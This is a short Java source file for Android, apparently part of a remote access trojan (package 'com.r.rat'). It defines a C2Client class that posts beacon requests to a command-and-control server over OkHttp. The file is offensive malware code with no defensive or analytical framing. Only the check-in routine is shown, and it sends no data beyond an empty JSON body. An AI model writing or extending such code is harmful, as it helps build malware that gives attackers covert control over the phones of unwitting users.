package com.r.rat;
import android.content.Context;
import okhttp3.*;
import java.util.concurrent.TimeUnit;
public class C2Client {
    private final OkHttpClient http;
    private final String base;
    public C2Client(String base, Context ctx) {
        this.base = base;
        this.http = new OkHttpClient.Builder()
            .connectTimeout(15, TimeUnit.SECONDS)
            .readTimeout(20, TimeUnit.SECONDS)
            .build();
    }
    public void beacon() throws Exception {
        Request req = new Request.Builder()
            .url(base + "/beacon")
            .post(RequestBody.create("{}", MediaType.parse("application/json")))
            .build();
        try (Response r = http.newCall(req).execute()) { /* no-op fallback */ }
    }
}